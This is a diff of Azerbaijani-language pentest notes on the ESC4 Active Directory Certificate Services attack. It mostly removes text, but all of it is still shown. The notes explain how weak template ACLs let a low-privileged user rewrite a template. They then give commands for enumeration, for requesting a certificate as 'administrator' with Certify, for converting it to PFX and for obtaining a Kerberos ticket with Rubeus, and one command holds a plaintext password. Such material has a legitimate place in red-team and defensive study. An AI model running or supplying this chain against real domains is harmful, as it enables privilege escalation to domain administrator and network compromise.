@@ -1,42 +1,3 @@
-# ESC4 — Template Misconfigured Access Control
-
----
-
-## ESC4 Nədir?
-
-ESC4, sertifikat şablonunun **Access Control List (ACL)**-inin səhv konfiqurasiya
-edilməsinə əsaslanır. Aşağı imtiyazlı bir istifadəçi və ya qrup şablon üzərində
-`WriteProperty`, `WriteDACL` və ya `WriteOwner` kimi icazələrə malik olduqda,
-şablonu modifikasiya edərək onu ESC1-ə çevirir və özü üçün sertifikat alır.
-
-Bir sözlə: **şablon parametrlərini dəyişdirmək** hüququ varsa → şablonu
-vulnerable hala gətir → exploit et → geri qaytar (opsional).
-
----
-
-## Lazımi Şərtlər
-
-```
-Zəif ACL            -    Aşağıdakılardan biri şablonda mövcuddur:
-                           WriteProperty / GenericWrite / GenericAll /
-                           WriteDACL / WriteOwner / FullControl
-İstifadəçi          -    Domain Users, Authenticated Users və ya hər hansı geniş qrup
-Şablon               -    CA-ya qoşulmuş, aktiv vəziyyətdə
-StrongBinding       -    reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement    --->    0x0
-```
-
-### Kritik ACL Hüquqları
-
-```powershell
-GenericAll        -    Tam nəzarət (şablonu istənilən şəkildə dəyişdirir)
-GenericWrite      -    Xüsusiyyətləri dəyişdirir (EKU, flags, v.s.)
-WriteProperty     -    Xüsusi atributları dəyişdirir
-WriteDACL         -    ACL-i dəyişdirir → özünə GenericAll verir
-WriteOwner        -    Owner-i dəyişdirir → sonra WriteDACL/GenericAll alır
-```
-
----
-
 ## ESC4 Enumeration
 
 ```powershell
@@ -49,23 +10,6 @@ certipy-ad find -u 'test@certificate.local' -p 'sako2005!' \
 # Certify.exe
 Certify.exe find /vulnerable
 Certify.exe find /vulnerable /ca:"CA-Server\CA-Name"
-```
-
----
-
-## ESC4 Enumeration With LDAP
-
-```powershell
-# Bütün sertifikat şablonlarını DACL ilə birlikdə siyahıla
-ldapsearch -x -H ldap://dc.domain.local \
-  -D "user@domain.local" -w 'Password123' \
-  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
-  "(objectClass=pKICertificateTemplate)" \
-  name nTSecurityDescriptor
-
-# PowerShell — şablon ACL-ini oxu
-$templatePath = "AD:\CN=VulnESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,$(Get-ADRootDSE | Select -Expand configurationNamingContext)"
-(Get-Acl $templatePath).Access | Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType
 ```
 
 ---
@@ -111,33 +55,6 @@ Set-ADObject $templateDN -Replace @{
 Certify.exe request /ca:"CA-Server\CA-Name" \
     /template:"VulnESC4" \
     /altname:"administrator"
-```
-
----
-
-## ESC4 Exploitation With Certify and Rubeus
-
-```powershell
-# Step 1 — Şablonu modifikasiya et (PowerShell ilə yuxarıdakı addımları icra et)
-
-# Step 2 — Administrator adına SAN ilə sertifikat al
-Certify.exe request /ca:"CA-Server\CA-Name" \
-    /template:"VulnESC4" \
-    /altname:"administrator"
-
-# Convert PEM → PFX (Linux)
-openssl pkcs12 -in admin_cert.pem \
-    -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
-    -export -out admin.pfx
-
-# Step 3 — TGT al
-Rubeus.exe asktgt /user:administrator \
-    /certificate:admin.pfx \
-    /password:'' /ptt
-
-# Yoxla
-klist
-whoami /all
 ```
 
 ---
